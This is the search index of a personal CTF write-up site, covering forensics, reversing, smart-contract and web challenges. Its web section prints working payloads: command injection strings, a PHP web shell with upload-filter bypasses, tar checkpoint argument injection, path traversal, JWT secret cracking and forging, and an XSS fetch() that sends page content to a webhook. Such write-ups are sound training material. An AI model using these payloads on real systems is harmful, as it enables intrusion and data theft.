{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"My CTF Journey &amp; Write-ups","text":"<p>Welcome to my security portfolio! Here I document the Capture The Flag (CTF) challenges I have solved, detailing the methodologies, tools, and thought processes used.</p>"},{"location":"#categories","title":"Categories","text":"<ul> <li>Forensics - Memory analysis, Disk imaging, Steganography.</li> <li>Web Security - SQL Injection, XSS, RCE, JWT Attacks.</li> <li>Reverse Engineering - Binary analysis, Game Hacking, Decompilation.</li> <li>Blockchain &amp; Crypto - Smart Contract analysis.</li> <li>Misc &amp; Network - Packet analysis, Protocol exploitation.</li> </ul>"},{"location":"#tools-used","title":"Tools Used","text":"<ul> <li>Network: Wireshark, Nmap, Burp Suite, Netcat</li> <li>Forensics: Volatility 3, Foremost, ExifTool, zsteg</li> <li>Reversing: Ghidra, dnSpy, Cheat Engine, ltrace, objdump</li> <li>Web: SQLMap, Python (Requests), Developer Tools</li> </ul> <p>Disclaimer: These write-ups are for educational purposes only.</p>"},{"location":"Blockchain_Crypto/","title":"Blockchain &amp; Cryptography Write-ups","text":""},{"location":"Blockchain_Crypto/#1-evil-vending-machine","title":"1. Evil Vending Machine","text":"<p>Target: Ethereum Smart Contract Bytecode</p> <p>Solution:</p> <ol> <li> <p>Decompilation: Used an online EVM decompiler (Dedaub) to convert bytecode to readable logic.</p> </li> <li> <p>Logic Analysis: The contract required a specific <code>CALLVALUE</code> (Ether amount) to satisfy an equation:</p> \\[(x \\times 87) - 15235 = 168,790,173,608\\] </li> <li> <p>Math: Solved for X:</p> \\[x = \\frac{168,790,173,608 + 15,235}{87}\\] \\[x = 1,940,117,289\\] </li> <li> <p>Flag: Converted the result to Hexadecimal: <code>0x73a3d729</code>.</p> </li> </ol> <p>Flag: <code>UVT{0x73...}</code></p>"},{"location":"Forensics/","title":"Forensics Write-ups","text":""},{"location":"Forensics/#1-alternating","title":"1. Alternating","text":"<p>Challenge: The <code>Flag.txt</code> file appears empty (0 bytes), even in hexdump.</p> <p>Solution: Discovering Alternate Data Streams (ADS) on NTFS.</p> <p>Steps:</p> <ol> <li> <p>Enumerated the streams associated with the file in PowerShell:</p> <p><code>powershell Get-Item -Path .\\Flag.txt.txt -Stream *</code></p> </li> <li> <p>Observed a hidden stream, for example <code>real_flag.txt</code>, which I read as follows:</p> <p><code>powershell Get-Content -Path .\\Flag.txt.txt -Stream real_flag.txt</code></p> </li> <li> <p>The hidden content contained the flag.</p> </li> </ol>"},{"location":"Forensics/#2-flag-shredder","title":"2. Flag Shredder","text":"<p>Challenge: A disk image received from a formatted USB that appears empty.</p> <p>Solution: Analysis with tools for recovering deleted files (carving).</p> <p>Steps:</p> <ol> <li> <p>Explored the image with <code>7-Zip</code> to view visible content.</p> </li> <li> <p>Used <code>foremost</code> to recover deleted files from the image:</p> <p><code>bash foremost -i image.img -o recovered_files</code></p> </li> <li> <p>Among the recovered files, found a deleted PNG that contained the flag.</p> </li> </ol>"},{"location":"Forensics/#3-ramblings-of-cornelia","title":"3. RAMblings of Cornelia","text":"<p>Challenge: Memory dump (<code>.raw</code>) from a system associated with a person named Cornelia.</p> <p>Solution: Analysis with Volatility to extract files and volatile data.</p> <p>Steps:</p> <ol> <li> <p>Ran Volatility plugins to find files in volatile memory (e.g., <code>windows.filescan</code>).</p> </li> <li> <p>Used <code>windows.dumpfiles</code> to extract the found files, including a <code>company_intel.zip</code>.</p> </li> <li> <p>Found a <code>.txt</code> file with instructions and a password; used the password to unlock the archive and extracted an image containing the flag.</p> </li> </ol> <p>Flag: <code>UVT{C0rn3l1a...}</code></p>"},{"location":"Forensics/#4-dark-web-stories","title":"4. Dark Web Stories","text":"<p>Challenge: A PCAP file captured from a Tor exit node.</p> <p>Solution: Traffic analysis, archive extraction, and flag extraction hidden in an image.</p> <p>Steps:</p> <ol> <li> <p>Inspected HTTP streams in the PCAP and identified a download of a <code>.zip</code> archive obtained through SQL Injection.</p> </li> <li> <p>The archive was password-protected; found the exchange of information and a series of MD5 hashes in the traffic.</p> </li> <li> <p>Reconstructed the password using the pattern observed in the MD5 hashes (sequential strings) and cracking tools (<code>john</code>).</p> </li> <li> <p>After unlocking the archive, extracted an image and used <code>zsteg</code> for LSB analysis; the result revealed the flag hidden in the bits.</p> </li> </ol>"},{"location":"Misc_Network/","title":"Misc &amp; Network Write-ups","text":""},{"location":"Misc_Network/#1-100-notes-later","title":"1. 100 Notes Later","text":"<p>Task: Connect to a music service.</p> <p>Solution:</p> <p>The challenge provided a netcat command: <code>nc 91.99.1.179 60001</code>.</p> <ol> <li> <p>Attempted to redirect output to a file:</p> <p><code>bash nc 91.99.1.179 60001 &gt; music.mp3</code></p> </li> <li> <p>Obstacle: The connection timed out.</p> </li> <li> <p>Diagnosis: The high port (60001) was blocked by my local network firewall.</p> </li> <li> <p>Fix: Switched to a mobile hotspot (cellular data) to bypass the restriction.</p> </li> </ol> <p>Status: Still experiencing connection issues, likely due to server-side problems.</p>"},{"location":"Reverse_Engineering/","title":"Reverse Engineering &amp; Game Hacking","text":""},{"location":"Reverse_Engineering/#1-insert-a-coin-to-play-gta-5-clone","title":"1. Insert a Coin to Play (GTA 5 Clone)","text":"<p>Target: Unity Game</p> <p>Goal: Collect 10 coins (Game limits to 5).</p> <p>Solution:</p> <p>This was a memory corruption challenge.</p> <ol> <li> <p>Used Cheat Engine to attach to the game process.</p> </li> <li> <p>Scanned for the integer value of coins (4 bytes).</p> </li> <li> <p>Collected a coin, refined the scan, and identified the memory address.</p> </li> <li> <p>Modified the value to <code>10</code>. The game logic triggered and revealed the flag.</p> </li> </ol>"},{"location":"Reverse_Engineering/#2-insert-a-coin-to-play-2-gta-6-clone","title":"2. Insert a Coin to Play 2 (GTA 6 Clone)","text":"<p>Target: Unity Game</p> <p>Goal: Collect 10 coins. Memory editing was patched.</p> <p>Solution:</p> <p>The hint \"who dare to listen\" suggests a network listener.</p> <ol> <li> <p>Static Analysis: Decompiled the game code (<code>Assembly-CSharp.dll</code>) using dnSpy.</p> </li> <li> <p>Code Review: Found the <code>GameManager</code> class. The \"listening\" part was a metaphor for a decryption function.</p> </li> <li> <p>Decrypt: Found the encrypted flag string <code>jldkgssdglkjsdlkj</code> and the logic (subtract 5 from ASCII value of each char).</p> </li> <li> <p>Wrote a Python script to decrypt the string:</p> <p><code>python encrypted = \"jldkgssdglkjsdlkj\" flag = ''.join(chr(ord(c) - 5) for c in encrypted) print(flag)</code></p> </li> </ol> <p>Flag: <code>UVT{Wh4t?!...}</code></p>"},{"location":"Reverse_Engineering/#3-random","title":"3. Random","text":"<p>Target: Linux Shared Library (<code>.x-sharedlib</code>) and Remote Service.</p> <p>Solution:</p> <ol> <li> <p>Analysis: Ran the binary locally; it asked for a number.</p> </li> <li> <p>Tracing: Used <code>ltrace ./main.x-sharedlib</code> to intercept library calls.</p> <ul> <li>Observed <code>srand(time(0))</code>: The random seed was based on the current timestamp (Predictable PRNG).</li> </ul> </li> <li> <p>Disassembly: Used <code>objdump -d -M intel</code> to inspect the code.</p> <p><code>bash objdump -d -M intel main.x-sharedlib</code></p> <ul> <li>Found a comparison: <code>cmp eax, 0x539</code>.</li> <li><code>0x539</code> in hex = 1337 in decimal.</li> </ul> </li> <li> <p>Exploit: Connected to the server and sent <code>1337</code>.</p> </li> </ol> <p>Flag: <code>flag{l33t_m3...}</code></p>"},{"location":"Web_Security/","title":"Web Security Write-ups","text":""},{"location":"Web_Security/#1-injector","title":"1. Injector","text":"<p>Challenge: A web page that executes ping commands.</p> <p>Solution:</p> <p>The URL <code>http://34.185.167.212:32229/index.php?host=127.0.0.1</code> returns <code>Command executed: ping -c 2 127.0.0.1</code>. This indicates Command Injection.</p> <p>I tried injecting <code>;ls</code> after the IP, which returned <code>flag.php</code> and <code>index.php</code>.</p> <p>By using <code>view-source:</code> or inspecting the page source after injecting <code>;cat flag.php</code>, I found the flag.</p> <p>Flag: <code>CTF{C0mm4nd...}</code></p>"},{"location":"Web_Security/#2-web-intro","title":"2. Web-Intro","text":"<p>Challenge: Access Denied page with a cookie.</p> <p>Solution:</p> <p>The page has a session cookie. The first part is Base64 encoded. Decoding it reveals <code>{\"logged_in\":false}</code>.</p> <p>I changed it to <code>true</code>, re-encoded it to Base64, and used OWASP ZAP to modify the cookie header and resend the request.</p>"},{"location":"Web_Security/#3-hisix","title":"3. Hisix","text":"<p>Challenge: A PHP file upload form.</p> <p>Solution:</p> <ol> <li> <p>The form only appears if <code>?start</code> is present in the URL: <code>if (!isset($_GET['start'])){ show_source(__FILE__); exit; }</code>.</p> </li> <li> <p>The code converts the extension to lowercase for saving but checks the extension before conversion in a case-sensitive way. I bypassed the blacklist by naming the file <code>shell.PhP</code>.</p> </li> <li> <p>It checks for images using <code>getimagesize</code>. I bypassed this by adding <code>GIF89a;</code> (Magic Bytes) at the start of the file.</p> </li> <li> <p>Payload: <code>GIF89a; &lt;?php system($_GET['cmd']); ?&gt;</code>.</p> </li> <li> <p>Upload successful, but accessing the file showed only <code>GIF89a</code>. This means <code>system()</code> commands are blocked.</p> </li> <li> <p>I uploaded a new script using PHP native functions: <code>print_r(scandir(\".\"));</code> to list files and <code>print_r(ini_get(\"disable_functions\"));</code> to see blocked functions.</p> </li> <li> <p>Blocked functions included: <code>eval, exec, passthru, system</code>, etc.</p> </li> <li> <p>I extended the script to check the root <code>../</code> and <code>/home</code>. I found <code>flag.php</code> in the parent directory.</p> </li> <li> <p>I used <code>echo file_get_contents(\"../flag.php\");</code> to read it. The flag was in the page source as a comment.</p> </li> </ol> <p>Flag: <code>ctf{aaf15c...}</code></p>"},{"location":"Web_Security/#4-manual-review","title":"4. Manual Review","text":"<p>Challenge: IT Support Ticket System.</p> <p>Solution:</p> <ol> <li> <p>Registered an account and found a \"Leave message for admins\" feature (Ticket system). This suggests Stored XSS.</p> </li> <li> <p>Simple alert showed a CSRF token. I needed to impersonate the admin.</p> </li> <li> <p>I tried stealing cookies using an image payload pointing to my Webhook.site, but the cookies were likely HttpOnly or just CSRF tokens.</p> </li> <li> <p>I changed strategy to exfiltrate the entire page content the admin sees:</p> <p><code>javascript fetch('https://webhook.site/MY_LINK', {   method: 'POST',   mode: 'no-cors',   body: document.body.innerHTML });</code></p> </li> <li> <p>The POST request received on my webhook contained the flag inside the User-Agent string of the bot.</p> </li> </ol> <p>Flag: <code>ctf{4852d6...}</code></p>"},{"location":"Web_Security/#5-tartarsausage","title":"5. TartarSausage","text":"<p>Challenge: \"Find the sausage and be a king of tar\".</p> <p>Solution:</p> <ol> <li> <p>The upload form only accepts JPG/PNG. I uploaded a PHP shell renamed as a fake PNG (<code>fakeimg.png</code>).</p> </li> <li> <p>I found a hidden HTML page (<code>sadjwjaskdkwkasjdkwasdasdas.html</code>) titled \"Enter tar\". Inputting commands there failed.</p> </li> <li> <p>The server creates a TAR archive of uploaded files. TAR has a vulnerability using <code>--checkpoint=1</code> and <code>--checkpoint-action=exec=cmd</code>.</p> </li> <li> <p>Normally, you upload files named <code>--checkpoint=1</code> to exploit this via wildcard <code>*</code>, but the upload filter enforced <code>.png</code> extensions, breaking this method.</p> </li> <li> <p>I realized I could inject arguments directly into the input field if the server command was <code>tar -cf archive.tar [USER_INPUT]</code>.</p> </li> <li> <p>Payload: <code>-cf arhiva.tar fakeimg.png --checkpoint=1 --checkpoint-action=exec=\"ls -la\"</code>.</p> </li> <li> <p>The output (blind RCE) didn't show in the browser initially, but eventually, I got a file listing showing a directory with a very long Base64-like name.</p> </li> <li> <p>Accessing <code>that_long_folder/flag</code> revealed the flag.</p> </li> </ol>"},{"location":"Web_Security/#6-file-crawler","title":"6. File-Crawler","text":"<p>Challenge: An image viewer using parameters like <code>?image_name=static/path.jpg</code>.</p> <p>Solution:</p> <p>This is a Directory Traversal vulnerability. I tried escaping the folder using <code>../</code>.</p> <p>I used a payload like <code>image_name=../../../../tmp/flag</code> (no extension mentioned in the hint).</p> <p>The server downloaded a file named <code>flag</code> which contained the text.</p> <p>Flag: <code>CTF{0caec4...}</code></p>"},{"location":"Web_Security/#7-under-construction","title":"7. Under Construction","text":"<p>Challenge: A website with a login and JWT session storage.</p> <p>Solution:</p> <ol> <li> <p>The user data in <code>localStorage</code> has an <code>id</code>, <code>username</code>, <code>role</code>, and <code>accessToken</code>.</p> </li> <li> <p>Modifying <code>localStorage</code> directly didn't work because the server verifies the JWT signature.</p> </li> <li> <p>Since the site is \"under construction\", I suspected a weak secret.</p> </li> <li> <p>I cracked the JWT secret using John the Ripper:</p> <p><code>bash john jwt.txt --format=HMAC-SHA256</code></p> </li> <li> <p>Secret found: <code>letmein</code>.</p> </li> <li> <p>I forged a new admin JWT (changing ID to 1 or Role to Admin) signed with this secret.</p> </li> <li> <p>Accessing <code>/api/app/admin</code> with the forged token gave the flag.</p> </li> </ol> <p>Flag: <code>CTF{e590d4...}</code></p>"},{"location":"Web_Security/#8-ping-station","title":"8. Ping Station","text":"<p>Challenge: Ping an IP address.</p> <p>Solution:</p> <p>Basic Command Injection. Inputting <code>127.0.0.1;ls</code> listed files. <code>127.0.0.1;cat flag</code> revealed the flag.</p> <p>Flag: <code>ECSC{b1c0bc...}</code></p>"},{"location":"Web_Security/#9-ping-station-v2","title":"9. Ping Station v2","text":"<p>Challenge: Ping an IP, but letters are filtered.</p> <p>Solution:</p> <p>Trying <code>127.0.0.1;ls</code> failed due to validation. <code>127.0.0.1%0a</code> (newline) also errored. The challenge requires bypassing a WAF that blocks letters. </p> <p>(Solution pending/in progress in notes, likely involves wildcards <code>?</code> or octal bypass)</p>"},{"location":"Web_Security/#10-small-data-leak","title":"10. Small Data Leak","text":"<p>Challenge: A guest list app using Flask/SQLAlchemy. <code>ls</code> input triggers a SQL error.</p> <p>Solution:</p> <ol> <li> <p>The error <code>SELECT ... FROM guests WHERE guests.id = '1==1'</code> confirms SQL Injection.</p> </li> <li> <p>I used UNION SELECT to retrieve data. The query requires 3 columns.</p> </li> <li> <p>Trying to list tables from <code>information_schema.tables</code> resulted in empty rows (Flask rendering issue).</p> </li> <li> <p>I used SQLMap on Kali:</p> <p><code>bash sqlmap -u URL --dbs sqlmap -u URL --dbms=postgresql --tables --delay 1</code></p> <p>Note: The <code>--delay 1</code> was crucial to avoid getting blocked.</p> </li> <li> <p>The list of tables contained one table named exactly as the flag: <code>ctf{57b234...}</code>.</p> </li> </ol>"},{"location":"Web_Security/#11-random-web2","title":"11. Random-Web2","text":"<p>Challenge: A blank page with <code>&lt;form&gt;</code>.</p> <p>Solution:</p> <ol> <li> <p>Adding <code>?source</code> revealed the PHP code.</p> </li> <li> <p>The code creates a sandbox folder based on <code>md5(session_id)</code>.</p> </li> <li> <p>It accepts a parameter <code>p</code>, truncates it to 6 characters, and runs <code>system(\"wget -qO - \" . $p);</code>.</p> </li> <li> <p>We need Command Injection within 6 chars.</p> </li> <li> <p><code>ls</code> showed <code>flag</code> and <code>index.php</code>.</p> </li> <li> <p>Tried <code>cat *f</code> or <code>sh f*</code>, but they were too long or failed.</p> </li> <li> <p>Tried executing via source <code>;. /f*</code> but it failed (likely because <code>flag</code> is not a valid script or is PHP).</p> </li> <li> <p>Solution: Using <code>od</code> (Octal Dump) which is only 2 letters:</p> <p><code>?p=;od /*</code></p> <p>This output the file content in octal format. I used a Python script to split the spaces and convert octal to ASCII strings.</p> </li> </ol> <p>Flag: <code>CTF{fc8155...}</code></p>"},{"location":"Web_Security/#12-authorization","title":"12. Authorization","text":"<p>Challenge: Blank page, 404 on <code>/admin</code>.</p> <p>Solution:</p> <p>Checking <code>robots.txt</code> showed a disallowed folder <code>/auth</code>. Accessing it gave \"405 Method Not Allowed\". </p> <p>(Further steps likely involve changing HTTP method to POST/PUT)</p>"}]}